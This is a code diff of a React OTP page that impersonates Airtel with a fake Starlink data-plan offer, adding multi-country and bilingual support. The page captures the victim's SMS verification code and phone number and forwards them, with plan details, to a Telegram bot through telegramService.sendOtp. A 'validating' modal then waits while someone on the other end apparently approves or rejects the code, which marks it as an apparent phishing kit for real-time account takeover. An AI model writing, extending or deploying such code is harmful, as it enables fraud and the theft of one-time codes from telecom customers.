@@ -5,6 +5,9 @@ import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
 import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
+import { LanguageSwitch } from './LanguageSwitch';
+import { useApp } from '../context/AppContext';
+import { CountryInfo } from '../data/countries';
 import {
   ShieldCheck,
   ArrowLeft,
@@ -21,6 +24,8 @@ interface OtpPageProps {
   pin: string;
   sessionId: string;
   selectedPlan: InternetPlan;
+  country?: CountryInfo;
+  fullPhone?: string;
   onBack: () => void;
   onOtpSuccess: () => void;
 }
@@ -30,9 +35,15 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   pin,
   sessionId,
   selectedPlan,
+  country: propCountry,
+  fullPhone: propFullPhone,
   onBack,
   onOtpSuccess,
 }) => {
+  const { country: ctxCountry, language, t } = useApp();
+  const country = propCountry || ctxCountry;
+  const displayPhone = propFullPhone || `${country.dialCode} ${phone}`;
+
   const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
   const [countdown, setCountdown] = useState(60);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -103,7 +114,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     },
     onRejected: () => {
       setIsWaitingTelegram(false);
-      setErrorMessage('Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.');
+      setErrorMessage(t('otpError'));
       setOtpDigits(['', '', '', '']);
       otpInputRefs.current[0]?.focus();
     },
@@ -117,10 +128,13 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     setErrorMessage(null);
 
     try {
-      // Send OTP to Telegram Bot directly or via server
+      // Send OTP with country and fullPhone to Telegram Bot
       await telegramService.sendOtp({
         sessionId,
         phone,
+        fullPhone: displayPhone,
+        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
+        airtelBrand: country.airtelBrand,
         otp: currentOtp,
         planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
         planPrice: selectedPlan.price,
@@ -128,7 +142,12 @@ export const OtpPage: React.FC<OtpPageProps> = ({
 
       setIsWaitingTelegram(true);
     } catch (err: any) {
-      setErrorMessage(err.message || 'Échec de transmission du code.');
+      setErrorMessage(
+        err.message ||
+          (language === 'fr'
+            ? 'Échec de transmission du code.'
+            : 'Failed to transmit security code.')
+      );
     } finally {
       setIsSubmitting(false);
     }
@@ -145,8 +164,8 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   return (
     <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
       {/* Top Header */}
-      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-4 px-4 sm:px-6">
-        <div className="max-w-4xl mx-auto flex items-center justify-between">
+      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-3.5 px-4 sm:px-6 sticky top-0 z-30">
+        <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
           <button
             type="button"
             id="btn-back-to-login"
@@ -154,65 +173,75 @@ export const OtpPage: React.FC<OtpPageProps> = ({
             className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
-            <span className="hidden xs:inline">Modifier les identifiants</span>
-            <span className="xs:hidden">Retour</span>
+            <span>{t('back')}</span>
           </button>
 
-          <div className="flex items-center gap-2">
-            <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider hidden sm:inline-block">
-              Validation 2FA Sécurisée
-            </span>
-            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+          <div className="flex items-center gap-3">
+            <LanguageSwitch variant="light" />
+
+            <div className="hidden sm:flex items-center gap-2 pl-2 border-l border-neutral-200">
+              <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider">
+                {t('airtelLitePortal')}
+              </span>
+              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+            </div>
           </div>
         </div>
       </header>
 
-      {/* Main OTP Center Box */}
-      <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-12">
+      {/* Main Center Box */}
+      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
         <motion.div
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          exit={{ opacity: 0, scale: 0.95 }}
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          exit={{ opacity: 0, y: -20 }}
           transition={{ duration: 0.35 }}
-          className="w-full max-w-lg bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-9 relative overflow-hidden"
+          className="w-full max-w-md bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-8 relative overflow-hidden"
         >
-          {/* Top Brand Stripe */}
+          {/* Subtle top red brand bar */}
           <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />
 
-          {/* Airtel NextGen Logo */}
-          <div className="flex flex-col items-center text-center mb-6">
-            <div className="w-14 h-14 rounded-2xl bg-red-50 text-[#E60000] flex items-center justify-center mb-3 shadow-inner border border-red-100">
-              <KeyRound className="w-7 h-7" />
+          {/* Selected Plan Summary Pill */}
+          <div className="mb-6 p-3.5 rounded-2xl bg-red-50/70 border border-red-100 flex items-center justify-between gap-2">
+            <div className="flex items-center gap-2.5 min-w-0">
+              <div className="w-8 h-8 rounded-xl bg-[#E60000] text-white flex items-center justify-center font-black text-xs shadow-sm shrink-0">
+                <Zap className="w-4 h-4" />
+              </div>
+              <div className="min-w-0">
+                <p className="text-[11px] font-semibold text-neutral-500 truncate">{t('selectedPlanPill')}</p>
+                <p className="text-xs font-black text-neutral-900 truncate">
+                  {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
+                </p>
+              </div>
             </div>
-            <AirtelLogo variant="nextgen" className="h-10 mb-2" />
-            <h2 className="text-xl sm:text-2xl font-black text-neutral-900 tracking-tight mt-2">
-              Vérification du Code OTP
-            </h2>
-            <p className="text-xs sm:text-sm text-neutral-500 mt-2 max-w-sm">
-              Un code de sécurité à <b>4 chiffres</b> a été transmis par SMS au numéro :
-            </p>
-            <div className="mt-2 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-xs font-bold text-neutral-800">
-              <span>🇨🇩 +243 {phone}</span>
+            <div className="text-right shrink-0">
+              <span className="font-black text-sm text-[#E60000]">{selectedPlan.price}</span>
             </div>
           </div>
 
-          {/* Selected Plan Summary Banner */}
-          <div className="mb-6 p-3.5 rounded-2xl bg-neutral-50 border border-neutral-200 flex items-center justify-between text-xs gap-2">
-            <div className="flex items-center gap-2 min-w-0">
-              <Zap className="w-4 h-4 text-[#E60000] shrink-0" />
-              <span className="font-medium text-neutral-600 truncate">Forfait:</span>
-              <span className="font-bold text-neutral-900 truncate">
-                {selectedPlan.dataAmount} {selectedPlan.dataUnit}
-              </span>
+          {/* Airtel Logo Header & Title */}
+          <div className="flex flex-col items-center text-center mb-6">
+            <AirtelLogo variant="nextgen" className="h-11 mb-2" />
+            <div className="w-12 h-12 rounded-2xl bg-red-100/70 text-[#E60000] flex items-center justify-center mb-3 shadow-inner">
+              <KeyRound className="w-6 h-6" />
             </div>
-            <span className="font-black text-[#E60000] shrink-0">{selectedPlan.price}</span>
+
+            <h2 className="text-lg sm:text-xl font-black text-neutral-900 tracking-tight">
+              {t('otpTitle')}
+            </h2>
+            <p className="text-xs text-neutral-500 mt-1.5 max-w-xs leading-relaxed">
+              {t('otpSubtitle')}{' '}
+              <strong className="text-neutral-800 font-bold font-mono">
+                {displayPhone}
+              </strong>
+            </p>
           </div>
 
           {/* Error Message Box */}
           {errorMessage && (
             <motion.div
-              initial={{ opacity: 0, y: -5 }}
-              animate={{ opacity: 1, y: 0 }}
+              initial={{ opacity: 0, scale: 0.95 }}
+              animate={{ opacity: 1, scale: 1 }}
               className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
             >
               <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
@@ -220,109 +249,124 @@ export const OtpPage: React.FC<OtpPageProps> = ({
             </motion.div>
           )}
 
-          {/* 4-Digit OTP Form */}
+          {/* Form */}
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
-              <label className="block text-xs font-bold text-neutral-600 uppercase tracking-wider text-center mb-3">
-                Saisissez les 4 chiffres du code SMS
-              </label>
+              <div className="flex items-center justify-between mb-2">
+                <label className="block text-xs font-bold text-neutral-700 uppercase tracking-wider">
+                  {t('otpInputLabel')}
+                </label>
+                <span className="text-[11px] font-bold text-neutral-400">
+                  {currentOtp.length}/4
+                </span>
+              </div>
 
-              {/* 4 Discrete Boxes */}
-              <div className="flex items-center justify-center gap-2.5 sm:gap-3.5">
-                {[0, 1, 2, 3].map((index) => (
-                  <input
-                    key={index}
-                    id={`otp-input-${index}`}
-                    ref={(el) => {
-                      otpInputRefs.current[index] = el;
-                    }}
-                    type="text"
-                    inputMode="numeric"
-                    autoFocus={index === 0}
-                    maxLength={1}
-                    value={otpDigits[index]}
-                    onChange={(e) => handleDigitChange(index, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(index, e)}
-                    onPaste={index === 0 ? handlePaste : undefined}
-                    className="w-12 h-14 sm:w-16 sm:h-16 text-center text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
-                  />
-                ))}
+              {/* 4 OTP Digit Boxes */}
+              <div className="flex items-center justify-center gap-3 sm:gap-4">
+                {[0, 1, 2, 3].map((index) => {
+                  const hasDigit = Boolean(otpDigits[index]);
+                  return (
+                    <div key={index} className="relative flex-1 max-w-[68px]">
+                      <input
+                        ref={(el) => {
+                          otpInputRefs.current[index] = el;
+                        }}
+                        type="text"
+                        inputMode="numeric"
+                        maxLength={1}
+                        autoFocus={index === 0}
+                        value={otpDigits[index]}
+                        onChange={(e) => handleDigitChange(index, e.target.value)}
+                        onKeyDown={(e) => handleKeyDown(index, e)}
+                        onPaste={handlePaste}
+                        className={`w-full h-13 sm:h-14 text-center text-xl sm:text-2xl font-black rounded-2xl border-2 transition-all bg-neutral-50 focus:bg-white focus:outline-none ${
+                          hasDigit
+                            ? 'border-[#0055FF] text-neutral-900 ring-2 ring-blue-500/10'
+                            : 'border-neutral-300 text-neutral-700 focus:border-[#0055FF] focus:ring-4 focus:ring-blue-500/10'
+                        }`}
+                      />
+                    </div>
+                  );
+                })}
               </div>
             </div>
 
-            {/* Resend Timer / Button */}
-            <div className="flex items-center justify-between text-xs pt-1 flex-wrap gap-2">
-              <span className="text-neutral-500 font-medium">Vous n'avez pas reçu le code ?</span>
-              <button
-                type="button"
-                id="btn-resend-otp"
-                disabled={countdown > 0}
-                onClick={handleResend}
-                className={`font-bold flex items-center gap-1 transition-colors ${
-                  countdown > 0
-                    ? 'text-neutral-400 cursor-not-allowed'
-                    : 'text-[#E60000] hover:underline cursor-pointer'
-                }`}
-              >
-                <RefreshCw className={`w-3.5 h-3.5 ${countdown > 0 ? 'animate-spin' : ''}`} />
-                <span>{countdown > 0 ? `Renvoyer (${countdown}s)` : 'Renvoyer le code'}</span>
-              </button>
+            {/* Resend Link / Timer */}
+            <div className="flex items-center justify-center text-xs">
+              {countdown > 0 ? (
+                <div className="text-neutral-500 flex items-center gap-1.5 font-medium">
+                  <RefreshCw className="w-3.5 h-3.5 animate-spin text-neutral-400" />
+                  <span>
+                    {t('resendIn')}{' '}
+                    <strong className="text-neutral-800 font-bold">{countdown}s</strong>
+                  </span>
+                </div>
+              ) : (
+                <button
+                  type="button"
+                  id="btn-resend-otp"
+                  onClick={handleResend}
+                  className="text-[#E60000] hover:text-[#c40000] font-black underline underline-offset-4 flex items-center gap-1 cursor-pointer transition-colors"
+                >
+                  <RefreshCw className="w-3.5 h-3.5" />
+                  <span>{t('resendButton')}</span>
+                </button>
+              )}
             </div>
 
             {/* Submit Button */}
             <button
               type="submit"
-              id="btn-validate-otp"
+              id="btn-otp-submit"
               disabled={!isOtpComplete || isSubmitting}
-              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-widest transition-all flex items-center justify-center gap-2 shadow-lg ${
+              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-wider transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer shadow-lg ${
                 isOtpComplete && !isSubmitting
-                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-600/30 cursor-pointer'
+                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-500/30'
                   : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
               }`}
             >
               {isSubmitting ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin" />
-                  <span>Validation du code OTP...</span>
+                  <span>{t('validating')}</span>
                 </>
               ) : (
-                <>
-                  <ShieldCheck className="w-5 h-5" />
-                  <span>VALIDER LE CODE OTP</span>
-                </>
+                <span>{t('confirmActivate')}</span>
               )}
             </button>
           </form>
 
-          {/* Security footnote */}
-          <div className="mt-6 pt-4 border-t border-neutral-100 flex items-center justify-center gap-2 text-[11px] text-neutral-500 font-medium">
-            <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
-            <span>Protégé par Airtel NextGen Security Gateway</span>
+          {/* Secure Guarantee Note */}
+          <div className="mt-6 pt-5 border-t border-neutral-100 flex items-center justify-center gap-2 text-center text-[11px] text-neutral-500">
+            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
+            <span>{t('secureNote')}</span>
           </div>
         </motion.div>
       </main>
 
-      {/* Validating OTP Modal */}
+      {/* Footer */}
+      <footer className="w-full bg-white border-t border-neutral-200 py-4 px-4 text-center text-xs text-neutral-500">
+        <div className="max-w-4xl mx-auto flex items-center justify-center gap-2">
+          <span>© 2026 {country.airtelBrand}</span>
+          <span>•</span>
+          <span>Starlink Direct-to-Cell</span>
+        </div>
+      </footer>
+
+      {/* Validating Modal */}
       <ValidatingModal
         isOpen={isWaitingTelegram}
         type="otp"
-        phone={phone}
+        phone={displayPhone}
         planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
-        status={telegramStatus}
+        status={
+          telegramStatus === 'approved'
+            ? 'approved'
+            : telegramStatus === 'rejected'
+            ? 'rejected'
+            : 'pending'
+        }
       />
-
-      {/* Footer with clean responsive spacing */}
-      <footer className="w-full bg-white border-t border-neutral-200 mt-auto py-8 sm:py-10 px-4 sm:px-6 text-center">
-        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-3 sm:gap-4">
-          <AirtelLogo variant="red" size="sm" />
-          <p className="text-xs text-neutral-600 font-medium">
-            En collaboration avec <span className="text-neutral-900 font-bold tracking-wider">STARLINK™</span>
-          </p>
-          <p className="text-[11px] text-neutral-400">
-            © 2026 Airtel Congo. Tous droits réservés.
-          </p>
-        </div>
-      </footer>
     </div>
   );
 };
